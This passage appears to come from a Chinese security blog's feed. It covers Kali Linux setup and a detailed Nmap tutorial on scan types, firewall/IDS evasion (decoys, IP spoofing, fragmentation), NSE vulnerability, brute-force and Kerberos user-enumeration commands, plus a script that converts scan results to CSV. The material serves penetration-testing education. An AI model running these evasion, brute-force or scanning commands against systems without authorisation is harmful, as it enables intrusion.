title="更改源"></a>更改源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑sources.list文件，并添加以下源，选择自己相对快一点的源。</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不会vim的可以使用图形界面编辑器</span></span><br><span class="line">sudo mousepad /etc/apt/sources.list</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">中科大源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">阿里云源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">清华大学源</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">浙大源</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">东软大学源</span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">新加坡kali源</span><br><span class="line">deb http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib</span><br><span class="line">deb-src http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib</span><br><span class="line">163 Kali源</span><br><span class="line">deb http://mirrors.163.com/debian wheezy main non-free contrib</span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy main non-free contrib</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get dist-upgrade</span><br><span class="line">sudo apt-get clean</span><br><span class="line">sudo apt-get autoclean</span><br></pre></td></tr></table></figure><h3 id="中文输入法"><a href="#中文输入法" class="headerlink" title="中文输入法"></a>中文输入法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ibus ibus-pinyin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">im-config</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211102152259852.png" alt="image-20211102152259852"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211102152341120.png" alt="image-20211102152341120"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ibus-setup</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211102152508614.png" alt="image-20211102152508614"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim .bashrc</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=ibus</span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=@im=ibus</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=ibus</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211102153948333.png" alt="image-20211102153948333"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><h3 id="高分辨率调整DPI"><a href="#高分辨率调整DPI" class="headerlink" title="高分辨率调整DPI"></a>高分辨率调整DPI</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211102154648400.png" alt="image-20211102154648400"></p><h3 id="当前文件夹搭建简单HTTP服务"><a href="#当前文件夹搭建简单HTTP服务" class="headerlink" title="当前文件夹搭建简单HTTP服务"></a>当前文件夹搭建简单HTTP服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure><p>指定端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure><p>指定后台运行，加&amp;：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000 &amp;</span><br></pre></td></tr></table></figure><blockquote><p>生成的新的进程为当前bash的子进程，当关闭当前bash时，相应的子进程也会被kill掉</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup python -m SimpleHTTPServer 8000 &amp;</span><br></pre></td></tr></table></figure><blockquote><p>加nohup，忽略所有的挂断信号，如果当前bash关闭，则当前进程会挂载到init进程下，成为其子进程，这样即使退出当前用户，其8000端口也可以使用。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 初始化 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap</title>
      <link href="/p/366383bb.html"/>
      <url>/p/366383bb.html</url>
      
        <content type="html"><![CDATA[<p>Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 它是网络管理员必用的软件之一，用以评估网络系统安全。Nmap通常用在信息搜集阶段，用于搜集目标机主机的基本状态信息。扫描结果可以作为漏洞扫描、漏洞利用和权限提升阶段的输入。例如，业界流行的漏洞扫描工具Nessus与漏洞利用工具Metasploit都支持导入Nmap的XML格式结果，而Metasploit框架内也集成了Nmap工具（支持Metasploit直接扫描）。</p><h2 id="参数信息"><a href="#参数信息" class="headerlink" title="参数信息"></a>参数信息</h2><p><code>nmap –iflist</code>查看本地主机的<strong>接口信息</strong>(INTERFACES)和<strong>路由信息</strong>(ROUTES)</p><p><code>-A</code> 选项用于使用进攻性方式扫描</p><p><code>-T4</code>指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4</p><p><code>-sn</code>只进行<strong>主机发现</strong>，不进行端口扫描</p><p><code>-sO</code>使用IP protocol扫描确定目标机支持的协议类型</p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829190612074.png" alt="image-20210829190612074" style="zoom: 80%;" /><p><code>-p</code> 扫描指定的端口</p><p><code>-sS/sT/sA/sW/sM</code>指定使用 TCP SYN半开放/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描</p><p><code>-sU</code>指定使用UDP扫描方式确定目标主机的UDP端口状况</p><p><code>-sY/sZ</code>使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况</p><p><code>-PO</code>使用IP协议包探测对方主机是否开启 </p><p><code>-PE/PP/PM</code>使用ICMP echo、ICMP timestamp、ICMP netmask 请求包发现主机</p><p><code>-PS/PA/PU/PY</code>使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现</p><p><code>-sN/sF/sX</code>指定使用TCP Null, FIN, and Xmas scans<strong>秘密扫描方式</strong>来协助探测对方的TCP端口状态</p><p><code>-v</code>表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态</p><p><code>-script &lt;script name&gt;</code> 指定扫描脚本</p><h3 id="和ping相关"><a href="#和ping相关" class="headerlink" title="和ping相关"></a>和ping相关</h3><p><code>-Pn</code> 不进行ping扫描（禁ping的时候）</p><p><code>-sP</code> 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描</p><p><code>-PI</code> 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。</p><h3 id="列表-amp-网段扫描"><a href="#列表-amp-网段扫描" class="headerlink" title="列表&amp;网段扫描"></a>列表&amp;网段扫描</h3><p><code>-iL 1.txt</code>批量扫描1.txt中的目标地址</p><p><code>-sL</code>List Scan列表扫描，仅将指定的目标的IP列举出来，不进行主机发现</p><p><code>nmap 192.168.1.0/24 -exclude 192.168.1.10</code>扫描除192.168.1.0外的该网段的其他地址<br><code>nmap 192.168.1.0/24 -excludefile f:/1.txt</code>扫描除给定文件中的地址以外的其他地址</p><h3 id="减少探测数量类"><a href="#减少探测数量类" class="headerlink" title="减少探测数量类"></a>减少探测数量类</h3><p><code>-F</code> 快速模式，仅扫描TOP 100的端口 </p><p><code>--top-ports &lt;number&gt;</code>扫描开放概率最高的number个端口</p><p><code>--port-ratio &lt;ratio&gt;</code>扫描指定频率以上的端口。与上述–top-ports类似，这里以概率作为参数</p><p><code>nmap -sS -sU --top-ports 100 [ip]</code>探测N个最有可能开放的端口</p><h3 id="DNS类"><a href="#DNS类" class="headerlink" title="DNS类"></a>DNS类</h3><p><code>-n</code>表示不进行DNS解析；</p><p><code>-R</code> 表示总是进行DNS解析。</p><p><code>--dns-servers</code>指定DNS服务器</p><p><code>--system-dns</code>指定使用系统的DNS服务器   </p><h3 id="版本探测-sV"><a href="#版本探测-sV" class="headerlink" title="版本探测-sV"></a>版本探测<code>-sV</code></h3><p><code>-sV</code>指定让Nmap进行版本侦测</p><p><code>--version-intensity &lt;level&gt;</code>指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</p><p><code>--version-light</code>指定使用轻量侦测方式 (intensity 2)</p><p><code>--version-all</code>尝试使用所有的probes进行侦测 (intensity 9)</p><p><code>--version-trace</code>显示出详细的版本侦测过程信息</p><h3 id="OS系统探测-O"><a href="#OS系统探测-O" class="headerlink" title="OS系统探测-O"></a>OS系统探测<code>-O</code></h3><p><code>-O</code>指定Nmap进行OS侦测，nmap拥有丰富的系统数据库nmap-os-db，目前可以识别2600多种操作系统与设备类型。</p><p><code>--osscan-limit</code>限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）</p><p><code>--osscan-guess</code>大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统</p><h3 id="结果输出类"><a href="#结果输出类" class="headerlink" title="结果输出类"></a>结果输出类</h3><p><code>-oX test.xml</code>将扫描结果生成 test.xml 文件，如果中断，则结果打不开</p><p><code>-oA test.xml</code>将扫描结果生成 test.xml 文件，中断后，结果也可保存</p><p><code>-oG test.txt</code>将扫描结果生成 test.txt 文件</p><h3 id="隐藏信息针对防火墙"><a href="#隐藏信息针对防火墙" class="headerlink" title="隐藏信息针对防火墙"></a>隐藏信息针对防火墙</h3><p><code>nmap -sF -T4 192.168.1.0</code> 探测防火墙状态</p><p><code>--badsum</code>使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，<br>说明回复来自防火墙或 IDS/IPS）</p><p><code>-e eth0</code>指定使用eth0网卡进行探测</p><p><code>-f : --mtu &lt;val&gt;</code>指定使用分片、指定数据包的 MTU</p><p><code>-b &lt;FTP relay host&gt;</code> 使用FTP bounce scan扫描方式</p><p><code>-g/--source-port &lt;portnum&gt;</code>使用指定源端口</p><p><code>-D  &lt;decoy1,decoy2[,ME],...&gt;</code>用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址</p><p><code>-S &lt;IP_Address&gt;</code>伪装成其他 IP 地址</p><p><code>--ttl &lt;val&gt;</code>设置 time-to-live 时间</p><p><code>--traceroute</code>追踪每个路由节点 </p><p><code>--scanflags &lt;flags&gt;</code>定制TCP包的flags</p><p><code>--data-length &lt;num&gt;</code>填充随机数据让数据包长度达到 Num</p><p><code>--ip-options &lt;options&gt;</code>使用指定的 IP 选项来发送数据包</p><p><code>--spoof-mac &lt;mac address/prefix/vendor name&gt;</code> 伪装 MAC 地址</p><p><code>--data-length &lt;num&gt;</code>填充随机数据让数据包长度达到 Num。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -Pn -D 10.96.10.100,10.96.10.110,ME  -e eth0  -g 5555 202.207.236.3</span><br></pre></td></tr></table></figure><h2 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h2><p>端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCP/UDP端口的开放情况。</p><ul><li><code>open</code>端口是开放的。</li><li><code>closed</code>端口是关闭的。</li><li><code>filtered</code>端口被防火墙IDS/IPS屏蔽，无法确定其状态。</li><li><code>unfiltered</code>端口没有被屏蔽，但是否开放需要进一步确定。</li><li><code>open|filtered</code>端口是开放的或被屏蔽，Nmap不能识别。</li><li><code>closed|filtered</code>端口是关闭的或被屏蔽，Nmap不能识别</li></ul><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><h3 id="当探测公网IP时"><a href="#当探测公网IP时" class="headerlink" title="当探测公网IP时"></a>当探测公网IP时</h3><p><strong>nmap -sn</strong></p><p>Nmap会发送四种不同类型的数据包来探测目标主机是否在线。</p><ol><li>ICMP echo request</li><li>a TCP SYN packet to port 443(https)</li><li>a TCP ACK packet to port 80(http)</li><li>an ICMP timestamp request</li></ol><p>依次发送四个报文探测目标机是否开启。只要收到其中一个包的回复，那就证明目标机开启。使用四种不同类型的数据包可以避免因防火墙或丢包造成的判断错误</p><p><strong>nmap -PE/-PP/-PM</strong></p><p><strong>-PE</strong> 的ICMP Echo扫描简单来说是通过向目标发送ICMP Echo数据包来探测目标主机是否存活，但由于许多主机的防火墙会禁止这些报文，所以仅仅ICMP扫描通常是不够的。  </p><p><strong>-PP</strong> 的ICMP time stamp时间戳扫描在大多数<strong>防火墙配置不当</strong>时可能会得到回复，可以以此方式来判断目标主机是否存活。倘若目标主机在线，该命令还会探测其开放的端口以及运行的服务！                    </p><p><strong>-PM</strong> 的ICMP address maskPing地址掩码扫描会试图用备选的ICMP等级Ping指定主机，通常有不错的<strong>穿透防火墙</strong>的效果</p><h3 id="探测内网IP时"><a href="#探测内网IP时" class="headerlink" title="探测内网IP时"></a>探测内网IP时</h3><p><strong>nmap -sn</strong></p><p>使用<code>nmap -sn [内网ip]</code>这个命令会发送<strong>arp请求包</strong>探测目标ip是否在线，如果有arp回复包，则说明在线。此命令可以探测目标主机是否在线，如果在线，还可以得到其MAC地址。但是不会探测其开放的端口号。</p><p><strong>nmap -PE/-PP/-PM</strong></p><p>使用 <code>nmap -PE/PP/PM [内网ip]</code> 探测主机的开启情况，使用的是ARP请求报文，如果有ARP回复报文，说明主机在线。-PP/PE/PM命令探测到主机在线后，还会探测主机的端口的开启状态以及运行的服务</p><h3 id="tcp"><a href="#tcp" class="headerlink" title="tcp"></a>tcp</h3><p><strong>TCP SYN 扫描(-sS)</strong></p><p>​    这是Nmap默认的扫描方式，通常被称作半开放扫描。该方式发送SYN到目标端口，如果收到SYN/ACK回复，那么可以判断端口是开放的；如果收到RST包，说明该端口是关闭的。如果没有收到回复，那么可以判断该端口被屏蔽了。因为该方式仅发送SYN包对目标主机的特定端口，但不建立完整的TCP连接，所以相对比较隐蔽，而且效率比较高，适用范围广。</p><p><strong>TCP connent 扫描(-sT)</strong></p><p>   TCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度慢，而且由于建立完整的TCP连接会在目标主机上留下记录，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑使用的方式</p><p><strong>TCP ACK 扫描(-sA)</strong></p><p>   向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽；没有收到RST包，说明被屏蔽。该方式只能用于确定防火墙是否屏蔽某个端口，可以辅助TCP SYN的方式来判断目标主机防火墙的状况</p><p><strong>TCP FIN/Xmas/NULL 扫描(-sN/sF/sX)</strong></p><p>   这三种扫描方式被称为秘密扫描，因为相对比较隐蔽。FIN扫描向目标主机的端口发送的TCP FIN包或Xmas tree包或NULL包，如果收到对方的RST回复包，那么说明该端口是关闭的；没有收到RST包说明该端口可能是开放的或者被屏蔽了。其中Xmas tree包是指flags中FIN URG PUSH被置为1的TCP包；NULL包是指所有的flags都为0的TCP包。</p><p><strong>UDP扫描(-sU)</strong></p><p>   UDP扫描用于判断UDP端口的情况，向目标主机的UDP端口发送探测包，如果收到回复ICMP port unreachable就说明该端口是关闭的；如果没有收到回复，那说明该UDP端口可能是开放的或者屏蔽的。因此，通过反向排除法的方式来判断哪些UDP端口是可能处于开放状态的。</p><p><strong>其他方式(-sY/-sZ)</strong></p><p>   除了以上几种常用的方式外，Nmap还支持多种其他的探测方式。例如使用SCTP INIT/Cookie-ECHO方式是来探测SCTP的端口开放情况；使用IP protocol方式来探测目标主机支持的协议类型(tcp/udp/icmp/sctp等等)；使用idle scan方式借助僵尸主机来扫描目标主机，以达到隐蔽自己的目的；或者使用FTP bounce scan，借助FTP允许的代理服务扫描其他的主机，同样达到隐蔽自己的目的</p><p><strong>nmap -A ip</strong></p><p>这个命令不仅列出目标主机开放的端口号，对应的服务，还较为详细的列出了服务的版本，其支持的命令,到达目标主机的每一跳路由等信息。在进行完全扫描时，扫描机与目标主机之间存在大量的数据流量交互，扫描时长随之增加。完全扫描不仅仅是TCP协议上的通信交互，还有例如ICMP、HTTP、NBSS、TDS、POP等等协议的交互，这些协议的交互是因为在完全扫描开始时首先对目标主机的开放端口进行了确认，之后再根据不同对应的不同服务进行服务版本信息探测、账户信息等信息的探测！</p><h2 id="防火墙-IDS规避"><a href="#防火墙-IDS规避" class="headerlink" title="防火墙/IDS规避"></a>防火墙/IDS规避</h2><p>防火墙与IDS规避为用于绕开防火墙与IDS的检测与屏蔽，以便能够更加详细地发现目标主机的状况。nmap提供了多种规避技巧通常可以从两个方面考虑规避方式：<strong>数据包的变换</strong>(Packet Change)和<strong>时序变换</strong>(Timing Change)</p><p><strong>分片</strong></p><p>将可疑的探测包进行分片处理(例如将TCP包拆分成多个IP包发送过去)，某些简单的防火墙为了加快处理速度可能不会进行重组检查，以此避开其检查</p><p><strong>IP诱骗(IP decoys)</strong></p><p>在进行扫描时，将真实IP地址在和其他主机的IP地址混合使用(其他主机需要在线，否则目标主机将回复大量数据包到不存在的数主机，从而实质构成了DOS攻击)，以此让目标主机的防火墙或IDS追踪大量的不同IP地址的数据包，降低其追查到自身的概率。但是，某些高级的IDS系统通过统计分析仍然可以追踪出扫描者真实的IP地址</p><p><strong>IP伪装</strong></p><p>IP伪装就是将自己发送的数据包中的IP地址伪装成其他主机的地址，从而目标机认为是其他主机与之通信。需要注意的是，如果希望接收到目标主机的回复包，那么伪装的IP需要位于统一局域网内。另外，如果既希望隐蔽自己的IP地址，又希望收到目标主机的回复包，那么可以尝试使用idle scan 或匿名代理等网络技术</p><p><strong>指定源端口</strong></p><p>某些目标主机只允许来自特定端口的数据包通过防火墙。例如，FTP服务器的配置为允许源端口为21号的TCP包通过防火墙与FTP服务器通信，但是源端口为其他的数据包被屏蔽。所以，在此类情况下，可以指定数据包的源端口</p><p><strong>扫描延时</strong></p><p>某些防火墙针对发送过于频繁的数据包会进行严格的侦查，而且某些系统限制错误报文产生的频率。所以，我们可以降低发包的频率和发包延时以此降低目标主机的审查强度</p><p><strong>其他技术</strong></p><p>nmap还提供其他多种规避技巧，比如指定使用某个网络接口来发送数据包、指定发送包的最小长度、指定发包的MTU、指定TTL、指定伪装的MAC地址，使用错误检查。</p><h2 id="NSE脚本引擎"><a href="#NSE脚本引擎" class="headerlink" title="NSE脚本引擎"></a>NSE脚本引擎</h2><p>NSE脚本引擎(Nmap Scripting Engine)是nmap最强大，最灵活的功能之一，允许用户自己编写脚本来执行自动化的操作或者扩展nmap的功能。</p><p>nmap的脚本库的路径：<code>/usr/share/nmap/scripts</code> 或 <code>/xx/nmap/scripts/ </code>，该目录下的文件都是nse脚本</p><p>NSE使用Lua脚本语言，并且默认提供了丰富的脚本库，目前已经包含了14个类别的350多个脚本。NSE的设计初衷主要考虑以下几个方面：</p><ul><li>网络发现（Network Discovery）</li><li>更加复杂的版本侦测（例如 skype 软件）</li><li>漏洞侦测(Vulnerability Detection)</li><li>后门侦测(Backdoor Detection)</li><li>漏洞利用(Vulnerability Exploitation)</li></ul><p><strong>Nmap的脚本主要分为以下几类：</strong></p><ul><li><p>Auth：负责处理鉴权证书(绕过鉴权)的脚本</p></li><li><p>Broadcast：在局域网内探查更多服务去开启情况，如DHCP/DNS等</p></li><li><p>Brute：针对常见的应用提供暴力破解方式，如HTTP/HTTPS</p></li><li><p>Default：使用-sC或-A选项扫描时默认的脚本，提供基本的脚本扫描能力</p></li><li><p>Discovery：对网络进行更多的信息搜集，如SMB枚举，SNMP查询等</p></li><li><p>Dos：用于进行拒绝服务攻击</p></li><li><p>Exploit：利用已知的漏洞入侵系统</p></li><li><p>External：利用第三方的数据库或资源 。如，进行whois解析</p></li><li><p>Fuzzer：模糊测试脚本，发送异常的包到目标机，探测出潜在漏洞</p></li><li><p>Intrusive：入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</p></li><li><p>Malware：探测目标是否感染了病毒，开启后门等</p></li><li><p>Safe：与Intrusive相反，属于安全性脚本</p></li><li><p>Version：负责增强服务与版本扫描功能的脚本</p></li><li><p>Vuln：负责检查目标机是否有常见漏洞，如MS08-067</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">nmap -script   smb-vuln-ms17-010  192.168.10.34     #可以探测该主机是否存在ms17_010漏洞</span><br><span class="line">nmap --max-parallelism 800 --script http-slowloris scanme.nmap.org  #可以探测该主机是否存在http拒绝服务攻击漏洞</span><br><span class="line">nmap -script http-iis-short-name-brute 192.168.10.34  #探测是否存在IIS短文件名漏洞</span><br><span class="line">nmap -script mysql-empty-password 192.168.10.34       #验证mysql匿名访问</span><br><span class="line">nmap -p 443 -script ssl-ccs-injection 192.168.10.34   #验证是否存在openssl CCS注入漏洞</span><br><span class="line">namp --script=auth 192.168.10.34 #鉴权扫描 扫弱口令</span><br><span class="line"> </span><br><span class="line">--script=http-waf-detect            #验证主机是否存在WAF</span><br><span class="line">--script=http-waf-fingerprint       #验证主机是否存在WAF</span><br><span class="line"> </span><br><span class="line">nmap --script-brute 192.168.1.1     #nmap可对数据库、SMB、SNMP等进行简单密码的暴力破解</span><br><span class="line">nmap --script-vuln  192.168.1.1     #扫描是否有常见漏洞</span><br><span class="line"> </span><br><span class="line">--script-updatedb         #更新脚本数据库</span><br><span class="line">--script-help             #输入脚本对应的使用方法</span><br><span class="line"></span><br><span class="line">namp -n -p 445 --script=broadcast 192.168.10.34#探测内网更多服务</span><br><span class="line">namp -script external baidu.com</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 当主机不在域环境，可通过以下命令爆破域内用户</span></span></span><br><span class="line">nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realx=&quot;xie.com&quot;,userdb=&quot;users.txt&quot; 192.168.10.131</span><br></pre></td></tr></table></figure><h2 id="vulscan-git"><a href="#vulscan-git" class="headerlink" title="vulscan.git"></a>vulscan.git</h2><p><a href="https://github.com/scipag/vulscan">https://github.com/scipag/vulscan</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/nmap/script</span><br><span class="line">sudo git clone https://github.com/scipag/vulscan</span><br><span class="line"><span class="meta">#</span><span class="bash">使用</span></span><br><span class="line">sudo nmap --script vulscan --script-args vulscandb=scipvuldb.csv -sV 192.168.201.131 |more</span><br></pre></td></tr></table></figure><h2 id="nmap-xml-csv"><a href="#nmap-xml-csv" class="headerlink" title="nmap-xml-csv"></a>nmap-xml-csv</h2><p>帮实习生写个脚本吧，功能是xml格式转换成表格方便客户查看</p><h3 id="安装libnmap模块"><a href="#安装libnmap模块" class="headerlink" title="安装libnmap模块"></a>安装libnmap模块</h3><p><a href="https://pypi.org/project/python-libnmap/">https://pypi.org/project/python-libnmap/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install python-libnmap</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619665649282-e7c89330-5fc3-4ecd-95e6-c9bda66bb364.png" alt="img"></p><p>window下这样报错家常便饭，先换官方手册上的git安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/savon-noir/python-libnmap.git</span><br><span class="line">cd python-libnmap</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>导入xml格式文件</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619666416703-ae2873aa-2510-4f30-925b-19f5ab14c74c.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnmap.parser <span class="keyword">import</span> NmapParser</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment">## xml --&gt; csv</span></span><br><span class="line">xml_filename = <span class="built_in">input</span>(<span class="string">&quot;输入要导入的xml文件路径：&quot;</span>)</span><br><span class="line">csv_filename = <span class="built_in">input</span>(<span class="string">&quot;导出文件名称或路径(chestnut:IDC_SYN.csv)：&quot;</span>)</span><br><span class="line"></span><br><span class="line">rep_obj = NmapParser.parse_fromfile(xml_filename)</span><br><span class="line">csv_obj = csv.writer(<span class="built_in">open</span>(csv_filename, <span class="string">&#x27;w&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">csv_obj.writerow([<span class="string">&#x27;主机&#x27;</span>, <span class="string">&#x27;端口&#x27;</span>, <span class="string">&#x27;协议&#x27;</span>, <span class="string">&#x27;服务&#x27;</span>, <span class="string">&#x27;状态&#x27;</span>, <span class="string">&#x27;信息&#x27;</span>])</span><br><span class="line"><span class="keyword">for</span> _host <span class="keyword">in</span> rep_obj.hosts:</span><br><span class="line">    <span class="keyword">for</span> serv <span class="keyword">in</span> _host.services:</span><br><span class="line">        data = [_host.ipv4, serv.port, serv.protocol, serv.service, serv.state, serv.banner]</span><br><span class="line">        csv_obj.writerow(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;xml转换成csv格式完成&#x27;</span>)</span><br></pre></td></tr></table></figure><p>环境是python3，打包下方便实习生使用</p><h3 id="使用，拖入就好"><a href="#使用，拖入就好" class="headerlink" title="使用，拖入就好"></a>使用，拖入就好</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1619687845621-aff36654-a3de-4bb5-b629-2b2cd6d74e05.png" alt="img"></p><h3 id="封装方法-命令行参数"><a href="#封装方法-命令行参数" class="headerlink" title="封装方法+命令行参数"></a>封装方法+命令行参数</h3><p><a href="https://www.runoob.com/python3/python3-command-line-arguments.html">https://www.runoob.com/python3/python3-command-line-arguments.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dirsearch</title>
      <link href="/p/56e7c490.html"/>
      <url>/p/56e7c490.html</url>
      
